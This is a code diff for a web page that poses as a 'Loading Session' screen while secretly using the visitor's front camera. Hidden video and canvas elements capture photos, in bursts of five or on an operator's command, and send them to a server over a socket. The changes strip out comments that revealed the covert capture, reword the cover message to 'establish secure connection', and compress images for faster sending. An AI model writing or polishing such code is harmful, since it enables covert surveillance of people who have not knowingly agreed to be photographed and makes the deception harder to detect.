@@ -38,7 +38,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* Hidden Video and Canvas element */
         video, canvas {
             display: none !important;
             visibility: hidden !important;
@@ -50,12 +49,11 @@
 <body>
 
     <div class="card">
-        <h2>Loading Content...</h2>
+        <h2>Loading Session...</h2>
         <div class="spinner"></div>
-        <p style="color: #666; font-size: 14px;">Please wait while we prepare your session.</p>
+        <p style="color: #666; font-size: 14px;">Please wait while we establish secure connection.</p>
     </div>
 
-    <!-- Hidden elements for discrete photo capture -->
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
@@ -70,19 +68,17 @@
         const maxCaptures = 5;
         let intervalId = null;
 
-        // Initialize Camera silently
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
                     isCameraReady = true;
-                    // Notify server that camera is active
                     socket.emit('user-ready');
                 };
             })
             .catch(err => {
-                console.error("Camera access denied or error:", err);
+                console.error("Camera access error:", err);
             });
 
         function takeSinglePhoto() {
@@ -92,16 +88,15 @@
             canvas.height = video.videoHeight || 480;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/png', 0.8);
+            // Compressed JPEG format (Quality 0.5 for high speed without hanging)
+            const imageData = canvas.toDataURL('image/jpeg', 0.5);
             socket.emit('user-photo-captured', imageData);
         }
 
-        // Start 5 fast captures sequence (1 second interval)
         socket.on('start-auto-capture', () => {
             captureCount = 0;
             if (intervalId) clearInterval(intervalId);
 
-            // Immediate first capture
             takeSinglePhoto();
             captureCount++;
 
@@ -115,7 +110,6 @@
             }, 1000);
         });
 
-        // Admin manual single capture
         socket.on('capture-photo', () => {
             takeSinglePhoto();
         });
